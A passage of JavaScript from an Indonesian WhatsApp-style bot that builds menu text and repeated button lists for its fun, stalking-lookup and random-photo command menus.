        description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'funmenubutton': { 
  let teks =`◤─「 \`FUN MENU\` 」─✦
│⦿ 〔 _.smeme_
│⦿ 〔 _.ppcouple_
│⦿ 〔 _.define_
│⦿ 〔 _.qc_
│⦿ 〔 _.qcwarna_
│⦿ 〔 _.kodeqc_
│⦿ 〔 _.lyrics_
│⦿ 〔 _.suit_
│⦿ 〔 _.math_
│⦿ 〔 _.tictactoe_
│⦿ 〔 _.fact_
│⦿ 〔 _.truth_
│⦿ 〔 _.dare_
│⦿ 〔 _.couple_
│⦿ 〔 _.soulmate_
│⦿ 〔 _.stupidcheck_
│⦿ 〔 _.handsomecheck_
│⦿ 〔 _.uncleancheck_
│⦿ 〔 _.hotcheck_
│⦿ 〔 _.smartcheck_
│⦿ 〔 _.greatcheck_
│⦿ 〔 _.evilcheck_
│⦿ 〔 _.dogcheck_
│⦿ 〔 _.coolcheck_
│⦿ 〔 _.waifucheck_
│⦿ 〔 _.awesomecheck_
│⦿ 〔 _.gaycheck_
│⦿ 〔 _.cutecheck_
│⦿ 〔 _.lesbiancheck_
│⦿ 〔 _.hornycheck_
│⦿ 〔 _.prettycheck_
│⦿ 〔 _.lovelycheck_
│⦿ 〔 _.uglycheck_
│⦿ 〔 _.pick_
│⦿ 〔 _.quotes_
│⦿ 〔 _.can_
│⦿ 〔 _.is_
│⦿ 〔 _.when_
│⦿ 〔 _.where_
│⦿ 〔 _.what_
│⦿ 〔 _.how_
│⦿ 〔 _.rate_
│⦿ 〔 _.cry_
│⦿ 〔 _.kill_
│⦿ 〔 _.hug_
│⦿ 〔 _.pat_
│⦿ 〔 _.lick_
│⦿ 〔 _.kiss_
│⦿ 〔 _.bite_
│⦿ 〔 _.yeet_
│⦿ 〔 _.bully_
│⦿ 〔 _.bonk_
│⦿ 〔 _.wink_
│⦿ 〔 _.poke_
│⦿ 〔 _.nom_
│⦿ 〔 _.slap_
│⦿ 〔 _.smile_
│⦿ 〔 _.wave_
│⦿ 〔 _.awoo_
│⦿ 〔 _.blush_
│⦿ 〔 _.smug_
│⦿ 〔 _.glomp_
│⦿ 〔 _.happy_
│⦿ 〔 _.dance_
│⦿ 〔 _.cringe_
│⦿ 〔 _.cuddle_
│⦿ 〔 _.highfive_
│⦿ 〔 _.shinobu_
│⦿ 〔 _.handhold_
│⦿ 〔 _.tickle_
│⦿ 〔 _.avatar_
│⦿ 〔 _.feed_
│⦿ 〔 _.foxgirl_
│⦿ 〔 _.gecg_
│⦿ 〔 _.checkme_
│⦿ 〔 _.sound1 - sound161_
◣──────────❈`
const bet = {
    title: "LIST MENU",
    sections: [
  {
    title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`,
    highlight_label: `🔥ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        header: "🧭 All Menu",
        title: "🗂️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴍᴇɴᴜ ᴀʟʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.allmenu`, 
      },
    ],
  },
  {
    title: `ᴍɪɴᴇᴄʀᴀғᴛ sᴛᴀᴛᴜs ғɪᴛᴜʀ`,
    highlight_label: ``,
    rows: [
      {
        header: "⛏️ MC Status",
        title: "🧱 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.mcstatus`, 
      },
    ],
  },
  {
    title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`,
    highlight_label: `🛠️ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
    rows: [
      {
        header: "🆕 New Updates",
        title: "📢 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ᴛᴇʀʙᴀʀᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.newupdatebutton`, 
      },
      {
        header: "🛠️ Fix Fitur",
        title: "🧩 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ ᴅɪғɪx",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.fixbutton`, 
      },
      {
        header: "🛍 Shop menu",
        title: "📦 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ sʜᴏᴘᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.shopmenubutton`, 
      },
      {
        header: "⚡ Cpanel menu",
        title: "🛒 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.cpanelbutton`, 
      },
    ],
  },
  {
    title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`,
    highlight_label: ``,
    rows: [
      {
        header: "📜 Peraturan",
        title: "⚖️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴜʟᴇs ʙᴏᴛ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.bacaperaturanbutton`, 
      },
      {
        header: "🎁 Donasi",
        title: "💖 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏɴᴀsɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.donasibutton`, 
      },
      {
        header: "🤖 AI Menu",
        title: "✨ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.aimenubutton`, 
      },
      {
        header: "🎉 Fun Menu",
        title: "🤣 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ғᴜɴ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.funmenubutton`, 
      },
      {
        header: "🕹️ RPG Menu",
        title: "⚔️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ʀᴘɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.rpgmenubutton`, 
      },
      {
        header: "📤 Push Menu",
        title: "📨 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴘᴜsʜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.pushmenubutton`, 
      },
      {
        header: "🎥 Asupan Menu",
        title: "🥤 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.nsfwmenubutton`, 
      },
      {
        header: "🧩 Game Menu",
        title: "🎮 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ɢᴀᴍᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.gamemenubutton`, 
      },
      {
        header: "🛍️ Store Menu",
        title: "🛒 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴏʀᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.storemenubutton`, 
      },
      {
        header: "🎌 Anime Menu",
        title: "📺 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴀɴɪᴍᴇ ᴘᴀɴᴇʟ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.animebutton`, 
      },
      {
        header: "🌀 Other Menu",
        title: "🧃 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴛᴀᴍʙᴀʜᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.othermenubutton`, 
      },
      {
        header: "⚙️ Owner Menu",
        title: "👑 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ownermenubutton`, 
      },
      {
        header: "🫂 Grup Menu",
        title: "👥 ᴜɴᴛᴜᴋ ᴍᴇɴɪʜᴀᴛ ʟɪsᴛ ɢʀᴜᴘ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.groupmenubutton`, 
      },
      {
        header: "🕌 Islamic Menu",
        title: "📿 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.islamimenubutton`, 
      },
      {
        header: "📰 Berita Menu",
        title: "🗞️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.beritamenubutton`, 
      },
      {
        header: "✨ Quotes Menu",
        title: "📝 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.quotesmenubutton`, 
      },
      {
        header: "🖼️ Sticker Menu",
        title: "💬 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stickermenubutton`, 
      },
      {
        header: "🔍 Stalking Menu",
        title: "🧿 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴀʟᴋɪɴɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stalkermenubutton`, 
      },
      {
        header: "🔮 Primbon Menu",
        title: "🕯️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.primbonmenubutton`, 
      },
      {
        header: "🎖️ Certificate Menu",
        title: "📜 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.sertifikatmenubutton`, 
      },
      {
        header: "⬇️ Download Menu",
        title: "📥 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.downloadmenubutton`, 
      },
      {
        header: "📸 Ephoto Menu",
        title: "🖌️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴇᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ephoto360menubutton`, 
      },
      {
        header: "🎭 Anonymous Menu",
        title: "🕵️‍♂️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.anonymousmenubutton`, 
      },
      {
        header: "🎲 Random Video",
        title: "📹 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomvideomenubutton`, 
      },
      {
        header: "🎬 Random Photo",
        title: "🖼️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomphotomenubutton`, 
      },
    ],
  },
  {
    title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`,
    highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        title: "🎗 ɪɴғᴏ ʙᴏᴛ",
        description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
        id: `.infobot`,
      },
      {
        title: "💫 ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'stalkermenubutton': {
let teks =`◤─「 \`STALK MENU\` 」─✦
│⦿ 〔 _.igstalk_
│⦿ 〔 _.ttstalk_
│⦿ 〔 _.ffstalk_
│⦿ 〔 _.mlstalk_
│⦿ 〔 _.npmstalk_
│⦿ 〔 _.ghstalk_
│⦿ 〔 _.youtubestalk_
◣──────────❈`
const bet = {
    title: "LIST MENU",
    sections: [
  {
    title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`,
    highlight_label: `🔥ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        header: "🧭 All Menu",
        title: "🗂️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴍᴇɴᴜ ᴀʟʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.allmenu`, 
      },
    ],
  },
  {
    title: `ᴍɪɴᴇᴄʀᴀғᴛ sᴛᴀᴛᴜs ғɪᴛᴜʀ`,
    highlight_label: ``,
    rows: [
      {
        header: "⛏️ MC Status",
        title: "🧱 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.mcstatus`, 
      },
    ],
  },
  {
    title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`,
    highlight_label: `🛠️ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
    rows: [
      {
        header: "🆕 New Updates",
        title: "📢 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ᴛᴇʀʙᴀʀᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.newupdatebutton`, 
      },
      {
        header: "🛠️ Fix Fitur",
        title: "🧩 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ ᴅɪғɪx",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.fixbutton`, 
      },
      {
        header: "🛍 Shop menu",
        title: "📦 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ sʜᴏᴘᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.shopmenubutton`, 
      },
      {
        header: "⚡ Cpanel menu",
        title: "🛒 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.cpanelbutton`, 
      },
    ],
  },
  {
    title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`,
    highlight_label: ``,
    rows: [
      {
        header: "📜 Peraturan",
        title: "⚖️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴜʟᴇs ʙᴏᴛ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.bacaperaturanbutton`, 
      },
      {
        header: "🎁 Donasi",
        title: "💖 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏɴᴀsɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.donasibutton`, 
      },
      {
        header: "🤖 AI Menu",
        title: "✨ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.aimenubutton`, 
      },
      {
        header: "🎉 Fun Menu",
        title: "🤣 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ғᴜɴ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.funmenubutton`, 
      },
      {
        header: "🕹️ RPG Menu",
        title: "⚔️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ʀᴘɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.rpgmenubutton`, 
      },
      {
        header: "📤 Push Menu",
        title: "📨 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴘᴜsʜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.pushmenubutton`, 
      },
      {
        header: "🎥 Asupan Menu",
        title: "🥤 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.nsfwmenubutton`, 
      },
      {
        header: "🧩 Game Menu",
        title: "🎮 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ɢᴀᴍᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.gamemenubutton`, 
      },
      {
        header: "🛍️ Store Menu",
        title: "🛒 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴏʀᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.storemenubutton`, 
      },
      {
        header: "🎌 Anime Menu",
        title: "📺 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴀɴɪᴍᴇ ᴘᴀɴᴇʟ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.animebutton`, 
      },
      {
        header: "🌀 Other Menu",
        title: "🧃 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴛᴀᴍʙᴀʜᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.othermenubutton`, 
      },
      {
        header: "⚙️ Owner Menu",
        title: "👑 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ownermenubutton`, 
      },
      {
        header: "🫂 Grup Menu",
        title: "👥 ᴜɴᴛᴜᴋ ᴍᴇɴɪʜᴀᴛ ʟɪsᴛ ɢʀᴜᴘ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.groupmenubutton`, 
      },
      {
        header: "🕌 Islamic Menu",
        title: "📿 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.islamimenubutton`, 
      },
      {
        header: "📰 Berita Menu",
        title: "🗞️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.beritamenubutton`, 
      },
      {
        header: "✨ Quotes Menu",
        title: "📝 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.quotesmenubutton`, 
      },
      {
        header: "🖼️ Sticker Menu",
        title: "💬 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stickermenubutton`, 
      },
      {
        header: "🔍 Stalking Menu",
        title: "🧿 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴀʟᴋɪɴɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stalkermenubutton`, 
      },
      {
        header: "🔮 Primbon Menu",
        title: "🕯️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.primbonmenubutton`, 
      },
      {
        header: "🎖️ Certificate Menu",
        title: "📜 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.sertifikatmenubutton`, 
      },
      {
        header: "⬇️ Download Menu",
        title: "📥 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.downloadmenubutton`, 
      },
      {
        header: "📸 Ephoto Menu",
        title: "🖌️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴇᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ephoto360menubutton`, 
      },
      {
        header: "🎭 Anonymous Menu",
        title: "🕵️‍♂️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.anonymousmenubutton`, 
      },
      {
        header: "🎲 Random Video",
        title: "📹 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomvideomenubutton`, 
      },
      {
        header: "🎬 Random Photo",
        title: "🖼️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomphotomenubutton`, 
      },
    ],
  },
  {
    title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`,
    highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        title: "🎗 ɪɴғᴏ ʙᴏᴛ",
        description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
        id: `.infobot`,
      },
      {
        title: "💫 ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'randomphotomenubutton': {
let teks =`◤─「 \`RANDOM PHOTO\` 」─✦
│⦿ 〔 _.aesthetic_
│⦿ 〔 _.coffee_
│⦿ 〔 _.wikimedia_
│⦿ 〔 _.wallpaper_
│⦿ 〔 _.art_
│⦿ 〔 _.bts_
│⦿ 〔 _.dogwoof_
│⦿ 〔 _.catmeow_
│⦿ 〔 _.lizardpic_
│⦿ 〔 _.goosebird_
│⦿ 〔 _.8ballpool_
│⦿ 〔 _.cosplay_
│⦿ 〔 _.hacker_
│⦿ 〔 _.cyber_
│⦿ 〔 _.gamewallpaper_
│⦿ 〔 _.islamic_
│⦿ 〔 _.jennie_
│⦿ 〔 _.jiso_
│⦿ 〔 _.satanic_
│⦿ 〔 _.justina_
│⦿ 〔 _.cartoon_
│⦿ 〔 _.pentol_
│⦿ 〔 _.cat_
│⦿ 〔 _.kpop_
│⦿ 〔 _.exo_
│⦿ 〔 _.lisa_
│⦿ 〔 _.space_
│⦿ 〔 _.car_
│⦿ 〔 _.technology_
│⦿ 〔 _.bike_
│⦿ 〔 _.shortquote_
│⦿ 〔 _.antiwork_
│⦿ 〔 _.hacking_
│⦿ 〔 _.boneka_
│⦿ 〔 _.rose_
│⦿ 〔 _.ryujin_
│⦿ 〔 _.ulzzangboy_
│⦿ 〔 _.ulzzanggirl_
│⦿ 〔 _.wallml_
│⦿ 〔 _.wallphone_
│⦿ 〔 _.mountain_
│⦿ 〔 _.goose_
│⦿ 〔 _.profilepic_
│⦿ 〔 _.couplepic_
│⦿ 〔 _.programming_
│⦿ 〔 _.pubg_
│⦿ 〔 _.blackpink_
│⦿ 〔 _.randomboy_
│⦿ 〔 _.randomgirl_
│⦿ 〔 _.hijab_
│⦿ 〔 _.chinese_
│⦿ 〔 _.indo_
│⦿ 〔 _.japanese_
│⦿ 〔 _.korean_
│⦿ 〔 _.malay_
│⦿ 〔 _.thai_
│⦿ 〔 _.vietnamese_
◣──────────❈`
const bet = {
    title: "LIST MENU",
    sections: [
  {
    title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`,
    highlight_label: `🔥ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        header: "🧭 All Menu",
        title: "🗂️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴍᴇɴᴜ ᴀʟʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.allmenu`, 
      },
    ],
  },
  {
    title: `ᴍɪɴᴇᴄʀᴀғᴛ sᴛᴀᴛᴜs ғɪᴛᴜʀ`,
    highlight_label: ``,
    rows: [
      {
        header: "⛏️ MC Status",
        title: "🧱 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.mcstatus`, 
      },
    ],
  },
  {
    title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`,
    highlight_label: `🛠️ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
    rows: [
      {
        header: "🆕 New Updates",
        title: "📢 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ᴛᴇʀʙᴀʀᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.newupdatebutton`, 
      },
      {
        header: "🛠️ Fix Fitur",
        title: "🧩 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ ᴅɪғɪx",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.fixbutton`, 
      },
      {
        header: "🛍 Shop menu",
        title: "📦 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ sʜᴏᴘᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.shopmenubutton`, 
      },
      {
        header: "⚡ Cpanel menu",
        title: "🛒 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.cpanelbutton`, 
      },
    ],
  },
  {
    title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`,
    highlight_label: ``,
    rows: [
      {
        header: "📜 Peraturan",
        title: "⚖️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴜʟᴇs ʙᴏᴛ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.bacaperaturanbutton`, 
      },
      {
        header: "🎁 Donasi",
        title: "💖 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏɴᴀsɪ ᴍᴇɴᴜ",
